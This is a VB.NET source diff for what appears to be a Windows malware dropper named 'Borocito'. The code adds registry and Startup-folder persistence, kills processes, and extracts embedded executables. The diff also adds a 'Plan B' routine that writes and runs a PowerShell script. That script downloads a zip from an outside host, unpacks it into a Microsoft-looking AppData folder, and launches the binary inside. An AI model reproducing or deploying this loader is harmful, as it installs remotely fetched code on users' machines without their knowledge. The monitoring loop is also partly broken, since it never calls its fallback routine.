@@ -100,25 +100,27 @@ Module StartUp
             AddToLog("CreateRootFolders@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
+End Module
+Module Extractor
     Sub CheckIfExist()
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             If regKey Is Nothing Then
-                AddToLog("CheckIfExist@StartUp", "Escribiendo valores en el registro...", False)
+                AddToLog("CheckIfExist@Extractor", "Escribiendo valores en el registro...", False)
                 SetExistence()
             Else
                 If regKey.GetValue("OwnerServer") = Nothing Then
                     SetExistence()
                 End If
                 If OverrideOwner Then
-                    AddToLog("CheckIfExist@StartUp", "Sobreescribiendo valores en el registro...", False)
+                    AddToLog("CheckIfExist@Extractor", "Sobreescribiendo valores en el registro...", False)
                     regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
                 End If
-                AddToLog("CheckIfExist@StartUp", "Leyendo valores del registro...", False)
+                AddToLog("CheckIfExist@Extractor", "Leyendo valores del registro...", False)
                 OwnerServer = regKey.GetValue("OwnerServer")
             End If
         Catch ex As Exception
-            AddToLog("CheckIfExist@StartUp", "Error: " & ex.Message, True)
+            AddToLog("CheckIfExist@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub SetExistence()
@@ -129,7 +131,7 @@ Module StartUp
             regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
         Catch ex As Exception
-            AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
+            AddToLog("SetExistence@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub StartWithWindows()
@@ -147,7 +149,7 @@ Module StartUp
                 My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
             End If
         Catch ex As Exception
-            AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
+            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub StartExtract()
@@ -159,7 +161,7 @@ Module StartUp
                     Borocito(i).Kill()
                 Next i
             Catch ex As Exception
-                AddToLog("StartExtract(KillProc(0))@StartUp", "Error: " & ex.Message, True)
+                AddToLog("StartExtract(KillProc(0))@Extractor", "Error: " & ex.Message, True)
             End Try
             Try
                 Dim Updater = Process.GetProcessesByName("BorocitoUpdater")
@@ -167,7 +169,7 @@ Module StartUp
                     Updater(i).Kill()
                 Next i
             Catch ex As Exception
-                AddToLog("StartExtract)KillProc(1))@StartUp", "Error: " & ex.Message, True)
+                AddToLog("StartExtract)KillProc(1))@Extractor", "Error: " & ex.Message, True)
             End Try
             Try
                 Dim Updater = Process.GetProcessesByName("BoroUpdater")
@@ -175,7 +177,7 @@ Module StartUp
                     Updater(i).Kill()
                 Next i
             Catch ex As Exception
-                AddToLog("StartExtract(KillProc(2))@StartUp", "Error: " & ex.Message, True)
+                AddToLog("StartExtract(KillProc(2))@Extractor", "Error: " & ex.Message, True)
             End Try
             Try
                 If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
@@ -183,7 +185,7 @@ Module StartUp
                 End If
                 My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Borocito.exe", My.Resources.Borocito, False)
             Catch ex As Exception
-                AddToLog("StartExtract(CopyTo(0))@StartUp", "Error: " & ex.Message, True)
+                AddToLog("StartExtract(CopyTo(0))@Extractor", "Error: " & ex.Message, True)
             End Try
             Try
                 If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
@@ -191,19 +193,100 @@ Module StartUp
                 End If
                 My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.BorocitoUpdater, False)
             Catch ex As Exception
-                AddToLog("StartExtract(CopyTo(1))@StartUp", "Error: " & ex.Message, True)
+                AddToLog("StartExtract(CopyTo(1))@Extractor", "Error: " & ex.Message, True)
             End Try
         Catch ex As Exception
-            AddToLog("StartExtract@StartUp", "Error: " & ex.Message, True)
+            AddToLog("StartExtract@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub InitUpdater()
         Try
             AddToLog("InitUpdater@StartUp", "Iniciando Updater...", False)
             Process.Start(DIRCommons & "\BorocitoUpdater.exe")
-            End
+            Dim threadMonitoring = New Threading.Thread(Sub() Monitoring("Boro Defender System", 120000))
+            threadMonitoring.Start()
         Catch ex As Exception
-            AddToLog("InitAll@StartUp", "Error: " & ex.Message, True)
+            AddToLog("InitAll@Extractor", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub Monitoring(ByVal procName As String, Optional ByVal timeOut As Integer = 90000)
+        Try
+            Threading.Thread.Sleep(timeOut) '2 minutos
+            Dim p() As Process = Process.GetProcessesByName(procName)
+            While True
+                If p.Count > 0 Then
+                    ' Process is running
+                    AddToLog("Monitoring", "The proccess is running! Closing...", False)
+                    End
+                Else
+                    ' Process is not running
+                    AddToLog("Monitoring", "The proccess is not running! Plan B...", False)
+                    'plan b
+                End If
+            End While
+        Catch ex As Exception
+            AddToLog("Monitoring@Extractor", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub PlanB()
+        Try
+            AddToLog("Extractor", "Inicializing Plan B", False)
+            Dim filePath As String = DIRTemp & "\Extractor.ps1"
+            Dim contenido As String = "Add-Type -AssemblyName System.IO.Compression.FileSystem" &
+                vbCrLf & "function AddToLog {" &
+                vbCrLf & "    param (" &
+                vbCrLf & "        [string]$contentMsg" &
+                vbCrLf & "    )" &
+                vbCrLf & "    Write-Host $contentMsg" &
+                vbCrLf & "    Start-Sleep -Seconds 1.5" &
+                vbCrLf & "}" &
+                vbCrLf & "AddToLog 'Inicializing the installer...'" &
+                vbCrLf & "AddToLog 'Seting variables...'" &
+                vbCrLf & "$ownerServer = 'safedomainfrominternet.atwebpages.com/Borocito'" &
+                vbCrLf & "AddToLog() 'Seting needed variables...'" &
+                vbCrLf & "$hostServer = 'http://' + $ownerServer" &
+                vbCrLf & "$binariesZip = $hostServer + '/Borocitos.cph'" &
+                vbCrLf & "$DIRCommons = -join('C:\Users\',[System.Environment]::UserName,'\AppData\Local\Microsoft\Borocito')" &
+                vbCrLf & "$outputZip = $DIRCommons + '\Borocitos.zip'" &
+                vbCrLf & "$runPacket = $DIRCommons + '\BorocitoUpdater.exe'" &
+                vbCrLf & "AddToLog() 'Starting...'" &
+                vbCrLf & "AddToLog() 'Checking registry...'" &
+                vbCrLf & "If (Test-Path 'HKCU:\SOFTWARE\Borocito') {" &
+                vbCrLf & "  AddToLog 'The registry already exist!'" &
+                vbCrLf & "}else {" &
+                vbCrLf & "  AddToLog 'The registry doesnt exist! Creating...'" &
+                vbCrLf & "  New-Item -Path 'HKCU:\SOFTWARE' -Name Borocito" &
+                vbCrLf & "  New-ItemProperty -Path 'HKCU:\SOFTWARE\Borocito' -Name 'OwnerServer' -Value $ownerServer -PropertyType 'String'" &
+                vbCrLf & "}" &
+                vbCrLf & "New-Item $DIRCommons -ItemType Directory" &
+                vbCrLf & "AddToLog ([string]::Format('Downloading zip binaries...`n	From: {0}`n	To: {1}', $binariesZip,$outputZip))" &
+                vbCrLf & "$webClient = [System.Net.WebClient]::new()" &
+                vbCrLf & "$webClient.DownloadFile($binariesZip, $outputZip)" &
+                vbCrLf & "AddToLog ([string]::Format('Extracting zip binaries...`n	From: {0}`n	To: {1}', $outputZip,$DIRCommons))" &
+                vbCrLf & "[System.IO.Compression.ZipFile]::ExtractToDirectory($outputZip, $DIRCommons)" &
+                vbCrLf & "AddToLog 'Starting the packet...'" &
+                vbCrLf & "AddToLog ([string]::Format('Starting packet......`n	Packet: {0}', $runPacket))" &
+                vbCrLf & "Start-Process -FilePath $runPacket" &
+                vbCrLf & "AddToLog 'Exiting...'" &
+                vbCrLf & "Exit"
+            If My.Computer.FileSystem.FileExists(filePath) Then
+                My.Computer.FileSystem.DeleteFile(filePath)
+            End If
+
+            My.Computer.FileSystem.WriteAllText(filePath, contenido, False)
+
+            AddToLog("Extractor", "Starting plan B...", False)
+
+            Process.Start("powershell.exe", filePath)
+
+            Threading.Thread.Sleep(5000)
+
+            AddToLog("Extractor", "Closing...", False)
+
+            End
+
+        Catch ex As Exception
+            AddToLog("PlanB@Extractor", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Module
